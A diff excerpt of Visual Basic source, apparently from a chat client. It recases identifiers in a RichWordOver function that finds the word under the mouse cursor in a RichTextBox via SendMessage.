@@ -3981,12 +4107,12 @@ On Error GoTo Error
     Dim start_pos As Integer
     Dim end_pos As Integer
     Dim ch As String
-    Dim txt As String
+    Dim Txt As String
     Dim txtlen As Integer
 
     'Convert the position to pixels.
-    pt.X = X \ Screen.TwipsPerPixelX
-    pt.Y = Y \ Screen.TwipsPerPixelY
+    pt.x = x \ Screen.TwipsPerPixelX
+    pt.y = y \ Screen.TwipsPerPixelY
 
     'Get the Char number
     Pos = SendMessage(rch.hWnd, &HD7, 0&, pt)
@@ -3996,7 +4122,7 @@ On Error GoTo Error
     End If
     
     'Find the start of the word.
-    txt = rch.Text
+    Txt = rch.Text
     
     If rch = RecTxt Then
         Exit Function
@@ -4029,12 +4155,12 @@ On Error GoTo Error
     start_pos = start_pos + 1
 
     'Find the end of the word.
-    txtlen = Len(txt)
+    txtlen = Len(Txt)
     
     If rch = RecTxt Then
         For end_pos = Pos To txtlen
         
-            ch = mid$(txt, end_pos, 1)
+            ch = mid$(Txt, end_pos, 1)
             
             'Allow digits, letters, and underscores.
             If ch = ":" Or end_pos > 15 + start_pos Then
@@ -4046,7 +4172,7 @@ On Error GoTo Error
     Else
         For end_pos = Pos To txtlen
         
-            ch = mid$(txt, end_pos, 1)
+            ch = mid$(Txt, end_pos, 1)
             
             'Allow digits, letters, and underscores.
             If Not ((ch >= "0" And ch <= "9") Or _
@@ -4062,7 +4188,7 @@ On Error GoTo Error
     end_pos = end_pos - 1
 
     If start_pos <= end_pos Then
-        RichWordOver = mid$(txt, start_pos, end_pos - start_pos + 1)
+        RichWordOver = mid$(Txt, start_pos, end_pos - start_pos + 1)
         
         If rch.Tag = RecTxt.Tag Then
             If LenB(RichWordOver) = LenB(UserName) Then
@@ -4076,7 +4202,7 @@ On Error GoTo Error
                 'RecTxt.SelStart = start_pos - 1
                 'RecTxt.SelLength = end_pos
                 'RecTxt.SelColor = vbRed
-            ElseIf mid$(txt, end_pos + 1, 1) = ":" Then
+            ElseIf mid$(Txt, end_pos + 1, 1) = ":" Then
                 'RecTxt.SelStart = start_pos - 1
                 'RecTxt.SelLength = end_pos
                 'RecTxt.SelColor = vbRed
